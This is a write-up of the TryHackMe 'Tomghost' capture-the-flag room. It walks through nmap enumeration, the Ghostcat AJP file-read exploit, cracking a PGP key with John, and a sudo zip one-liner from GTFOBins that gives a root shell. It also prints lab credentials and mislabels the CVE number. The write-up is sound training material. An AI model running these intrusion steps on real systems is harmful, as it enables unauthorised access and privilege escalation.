# Tomghost

## Nmap

```
sudo nmap 10.10.16.201 -p- -sS -sV

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 
(Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 8080 is running Tomcat as shown below:

Port 8009 is running ajp13. Researching this service shows this is a port that runs alongside Apache Tomcat. A brief description of this service is shown below:

_Ajp13 protocol is packet-oriented TCP protocol, by default this service runs on port 8009. AJP13 protocol is a binary format, which is intended for better performance over the HTTP protocol running over TCP port 8080_.

Researching exploits for this service we can see a vulnerability known as Ghostcat. This exploit (**CVE-2020-10487**) allows us to read local files in the Tomcat web directory and even configuration files. Below is a PoC for this on Github.

{% embed url="https://github.com/00theway/Ghostcat-CNVD-2020-10487" %}

First download the python file and run with the following syntax:

```
python3 exploit.py <TargetIP> <PORT> <FileToRead> read 
```

We now have the credentials: `skyfuck:8730281lkjlkjdqlksalks` Using the gathered cerednetials we are then able to connect by SSH.

![](<../../../.gitbook/assets/image (939).png>)

The home directory for skyfuck contains a file called tryhackme.asc. The file can be used to decrypt the contents of credential.pgp.

First we need to copy the contents of tryhackme.asc to our attacking machine then use `gpg2john` to create a hash of the file. After completing this John can be run to crack the passphrase.

Then on the SSH session import the key then attempt to decrypt the credential.pgp file with `gpg -d`.

```
gpg --import tryhackme.asc
gpg -d credential.pgp
```

![](<../../../.gitbook/assets/image (942).png>)

Which we can then SSH in as the user 'merlin'.

Running `sudo -l` on the user shows we can run the zip binary as root without supplying a password. Refering to GTFOBins at [https://gtfobins.github.io/gtfobins/zip/](https://gtfobins.github.io/gtfobins/zip/). Shows for the zip binary we can gain a root shell running:

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```
